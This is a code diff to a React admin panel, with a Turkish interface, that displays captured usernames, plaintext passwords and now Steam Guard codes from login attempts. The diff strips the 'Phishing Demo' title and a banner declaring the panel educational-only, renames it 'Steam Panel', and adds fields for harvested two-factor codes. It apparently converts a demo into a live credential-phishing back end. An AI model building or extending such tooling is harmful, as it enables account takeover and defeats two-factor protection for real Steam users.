@@ -2,15 +2,15 @@
 import React, { useState, useEffect } from 'react';
 import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
 import { Button } from '@/components/ui/button';
-import { RefreshCcw, Shield, AlertTriangle } from 'lucide-react';
+import { RefreshCcw, Shield } from 'lucide-react';
 import { toast } from 'sonner';
-import { Alert, AlertDescription, AlertTitle } from '@/components/ui/alert';
 
 // Type for our mock database entries
 interface LoginAttempt {
   id: string;
   username: string;
   password: string;
+  steamguard?: string;
   timestamp: string;
   status: 'pending' | 'rejected' | 'awaiting_2fa' | 'completed';
 }
@@ -108,21 +108,12 @@ const AdminPanel = () => {
   return (
     <div className="container mx-auto p-6 max-w-6xl">
       <div className="flex justify-between items-center mb-6">
-        <h1 className="text-2xl font-bold">Phishing Demo Yönetim Paneli</h1>
+        <h1 className="text-2xl font-bold">Steam Panel</h1>
         <Button variant="outline" onClick={() => fetchLoginAttempts()}>
           <RefreshCcw className="mr-2 h-4 w-4" />
           Yenile
         </Button>
       </div>
-
-      <Alert variant="destructive" className="mb-6">
-        <AlertTriangle className="h-4 w-4" />
-        <AlertTitle>Eğitim Amaçlı Demo</AlertTitle>
-        <AlertDescription>
-          Bu panel yalnızca eğitim amaçlıdır ve bir üniversite sunumu için tasarlanmıştır. 
-          Gerçek kişisel bilgiler asla kaydedilmemelidir.
-        </AlertDescription>
-      </Alert>
 
       <div className="grid gap-4">
         <Card>
@@ -143,6 +134,7 @@ const AdminPanel = () => {
                     <tr className="border-b">
                       <th className="text-left p-2">Kullanıcı Adı</th>
                       <th className="text-left p-2">Şifre</th>
+                      <th className="text-left p-2">Steam Guard</th>
                       <th className="text-left p-2">Zaman</th>
                       <th className="text-left p-2">Durum</th>
                       <th className="text-right p-2">İşlemler</th>
@@ -153,6 +145,7 @@ const AdminPanel = () => {
                       <tr key={attempt.id} className="border-b">
                         <td className="p-2">{attempt.username}</td>
                         <td className="p-2">{attempt.password}</td>
+                        <td className="p-2">{attempt.steamguard || '-'}</td>
                         <td className="p-2">{new Date(attempt.timestamp).toLocaleString()}</td>
                         <td className="p-2">
                           <span className={`px-2 py-1 rounded text-xs ${
